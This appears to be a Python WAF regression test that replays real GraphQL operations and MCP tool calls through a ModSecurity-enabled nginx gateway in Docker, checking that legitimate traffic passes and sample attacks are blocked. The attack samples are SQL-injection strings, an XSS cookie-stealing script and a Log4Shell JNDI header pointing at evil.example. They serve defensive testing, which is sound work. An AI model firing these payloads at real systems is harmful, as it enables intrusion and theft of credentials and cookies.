#!/usr/bin/env python3
"""CRS false-positive replay: real GraphQL operations and MCP calls through
dalton with ModSecurity On. Fails if any legitimate request is blocked, or if
any of the attacks below gets through.

  python3 -I test/crs-replay.py [image] [fleet sites dir] [repos root]

GraphQL documents are extracted from the UIs' sources under [repos root]
(woodhouse-ui, hs-deploy-ui, homestretch/homestretch-ui, botsafely-ui,
rally-ui, 5drive-demo-ui); free-text variables get ordinary prose. MCP calls
carry Claude Code's params._meta, with free-form tool arguments.
Added after CRS blocked both on Hikari-preview (2026-11-15).
"""
import collections, json, pathlib, re, socket, subprocess, sys, time
HERE = pathlib.Path(__file__).resolve().parent
IMAGE = sys.argv[1] if len(sys.argv) > 1 else "dalton:nginx-dev"
SITES = pathlib.Path(sys.argv[2] if len(sys.argv) > 2 else HERE.parent.parent / "hs-backend-spot" / "sites").resolve()
HS = pathlib.Path(sys.argv[3] if len(sys.argv) > 3 else HERE.parent.parent).resolve()
PROSE = "Looks good to me. Approving the deploy, though the fleet name in the reason was wrong (it's Hikari-preview, not Rally); we can fix it later."

def graphql_docs():
    out = []
    for root, host in [("woodhouse-ui","woodhouse.test"),("hs-deploy-ui","hs-deploy.test"),("homestretch/homestretch-ui","homestretch.test"),
                       ("botsafely-ui","botsafely.test"),("rally-ui","rally.test"),("5drive-demo-ui","5drive.test")]:
        base = HS/root/"src"
        if not base.exists(): continue
        for f in base.rglob("*.ts*"):
            if "node_modules" in f.parts or f.name.endswith(".test.ts"): continue
            t = f.read_text(errors="ignore")
            for m in re.finditer(r"`([^`]*?\b(?:query|mutation|subscription)\b[^`]*?\{[^`]*?)`", t, re.S):
                doc = re.sub(r"\$\{[^}]*\}", "", m.group(1)).strip()
                if not re.search(r"^\s*(query|mutation|subscription|fragment|\{)", doc): continue
                vars_ = {v: ("2026-11-15T17:00:00Z" if "at" in v.lower() or "time" in v.lower() else
                             50 if v.lower() in ("limit","first","last","count","take") else
                             PROSE if v.lower() in ("body","text","description","reason","message","content","note","prompt","title") else
                             "9b2f6c1e-1d2a-4b8e-9a7c-3f0e2d1c4b5a")
                         for v in re.findall(r"\$([A-Za-z_][A-Za-z0-9_]*)\s*:", doc)}
                out.append({"host": host, "file": str(f.relative_to(base.parent.parent)), "body": {"query": doc, "variables": vars_}})
    return out

KEY = "Abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKL"
HOSTS = {"WOODHOUSE":"woodhouse.test","HS_DEPLOY":"hs-deploy.test","HOMESTRETCH":"homestretch.test","BOTSAFELY":"botsafely.test",
         "FIVEDRIVE":"5drive.test","RALLY":"rally.test","LLOQUENT":"lloquent.test","YAHOO_FINANCE_MCP":"yf.test","CLINICAL_TRIALS_MCP":"ct.test",
         "CAMELID_MCP":"camelid.test","BLENDER_GRAPH_MCP":"bg.test","EULEGAL_MCP":"eulegal.test","GRAPHVIEW":"graphview.test",
         "SSO":"sso.test","LOGIN":"login.test","BIOALPHAENGINE_MCP":"bae.test"}
def sh(*a, check=False): return subprocess.run(a, capture_output=True, text=True, check=check)
names = set(re.findall(r"^\s*server\s+([a-z0-9-]+):\d+\s+resolve", "\n".join(p.read_text() for p in SITES.glob("*.conf")), re.M))
sh("docker","network","create","fp-net")
for n in names:
    sh("docker","rm","-f",f"fp-{n}")
    sh("docker","run","-d","--name",f"fp-{n}","--network","fp-net","--network-alias",n,"-e",f"NAME={n}","-v",f"{HERE / 'stub.py'}:/stub.py:ro","python:3.12-alpine","python","-u","/stub.py","3000","4433","4444")
sh("docker","rm","-f","fp-dalton")
env = sum([["-e", f"{k}_HOSTNAME={v}"] for k, v in HOSTS.items()], [])
r = sh("docker","run","-d","--name","fp-dalton","--network","fp-net","-p","127.0.0.1:18097:3000","--read-only","--tmpfs","/tmp:size=256m",
       "-v",f"{SITES}:/etc/nginx/templates:ro","-e",f"HS_API_KEY={KEY}","-e","MODSEC_RULE_ENGINE=On","-e","RATE_LIMIT=off","-e","OTEL_ENABLED=false",*env,IMAGE)
if r.returncode: print(r.stderr); sys.exit(1)
time.sleep(5)
def post(host, path, body, extra=()):
    data = json.dumps(body).encode()
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nx-hs-api: {KEY}\r\nX-Forwarded-For: 82.6.91.58\r\nContent-Type: application/json\r\n"
           f"Accept: application/json, text/event-stream\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: {len(data)}\r\nConnection: close\r\n"
           + "".join(f"{k}: {v}\r\n" for k, v in extra) + "\r\n").encode()
    s = socket.create_connection(("127.0.0.1", 18097), timeout=10); s.sendall(hdr + data)
    resp = b""
    while True:
        c = s.recv(65536)
        if not c: break
        resp += c
    s.close()
    return int(resp.split(b" ", 2)[1])
results = []
ATTACKS = []
if True:
    docs = graphql_docs()
    docs.append({"host":"woodhouse.test","file":"ATTACK sqli in variable","body":{"query":"mutation Approve($id: ID!, $note: String) { approve(id: $id, note: $note) { id } }","variables":{"id":"1","note":"x' UNION SELECT password FROM users--"}}})
    docs.append({"host":"woodhouse.test","file":"ATTACK xss in variable","body":{"query":"mutation Approve($id: ID!, $note: String) { approve(id: $id, note: $note) { id } }","variables":{"id":"1","note":"<script>alert(document.cookie)</script>"}}})
    for d in docs:
        if d["host"] not in HOSTS.values(): continue
        st = post(d["host"], "/api/graphql", d["body"])
        results.append((st, d["host"], d["file"], d["body"]["query"].split("{")[0].strip()[:60]))
if True:
    meta = {"progressToken": 7, "claudecode/toolUseId": "toolu_01AbCdEfGh1234567890", "claudeai/sessionId": "f3c1b2a0-1111-2222-3333-444455556666"}
    calls = [
      {"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{"roots":{"listChanged":True}},"clientInfo":{"name":"claude-code","version":"2.3.0"}}},
      {"jsonrpc":"2.0","method":"notifications/initialized"},
      {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{"_meta":meta}},
      {"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"queue_deploy","arguments":{"fleet":"Bioaperture-preview","reason":"hs-bae-spot fcb0b41: nginx dalton; replace node from the /etc/server-setup config window"},"_meta":meta}},
      {"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"get_deploy_status","arguments":{"taskId":"243cd95c-034e-4b8f-b22b-df017fc52692"},"_meta":meta}},
      {"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"search_studies","arguments":{"query":"pembrolizumab AND (NSCLC OR lung) select arm","pageSize":20},"_meta":meta}},
      {"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"eulegal_search","arguments":{"q":"Article 6 high-risk; union all obligations where provider = 'deployer'"},"_meta":meta}},
      {"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"graph_render","arguments":{"cypher":"(a:Person {name: \"x\"})-[:KNOWS]->(b)"},"_meta":meta}},
    ]
    for host in ["hs-deploy.test","woodhouse.test","homestretch.test","yf.test","ct.test","camelid.test","eulegal.test","graphview.test","bg.test","bae.test"]:
        for c in calls:
            st = post(host, "/mcp", c, [("Mcp-Protocol-Version","2025-11-25"),("Authorization","Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln")])
            results.append((st, host, "mcp", c.get("method")+":"+str(c.get("params",{}).get("name",""))))
        # The headers and query string must still be inspected on /mcp (until 2026-11-20 nothing was).
        auth = [("Mcp-Protocol-Version","2025-11-25"),("Authorization","Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln")]
        st = post(host, "/mcp", calls[2], auth + [("Referer", "${jndi:ldap://evil.example/a}")])
        results.append((st, host, "ATTACK mcp log4shell header", "tools/list"))
        st = post(host, "/mcp?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", calls[2], auth)
        results.append((st, host, "ATTACK mcp sqli in query string", "tools/list"))
log = sh("docker","logs","fp-dalton").stderr + sh("docker","logs","fp-dalton").stdout
fired = collections.Counter()
for line in log.splitlines():
    if "ModSecurity" not in line or "[id \"949110\"]" in line: continue
    rid = re.search(r'\[id "(\d+)"\]', line); data = re.search(r'\[data "([^"]{0,90})', line); uri = re.search(r'\[uri "([^"]+)"', line)
    if rid: fired[(rid.group(1), (data.group(1) if data else ""), uri.group(1) if uri else "")] += 1
blocked = [x for x in results if x[0] == 403]
attacks = [x for x in results if x[2].startswith("ATTACK")]
legit = [x for x in results if not x[2].startswith("ATTACK")]
fp = [x for x in legit if x[0] == 403]
missed = [x for x in attacks if x[0] != 403]
print(f"{len(legit)} legitimate requests, {len(fp)} blocked; {len(attacks)} attacks, {len(missed)} let through")
for x in fp: print("   BLOCKED", x[1], x[2], x[3])
for x in missed: print("   MISSED ", x[1], x[2], x[0])
print(" rules that fired on legitimate traffic or attacks (rule, data, uri) x count:")
for (rid, data, uri), n in fired.most_common(25): print(f"   {rid} x{n} {uri} :: {data}")
sh("docker","rm","-f","fp-dalton")
for n in names: sh("docker","rm","-f",f"fp-{n}")
sh("docker","network","rm","fp-net")
sys.exit(1 if fp or missed else 0)
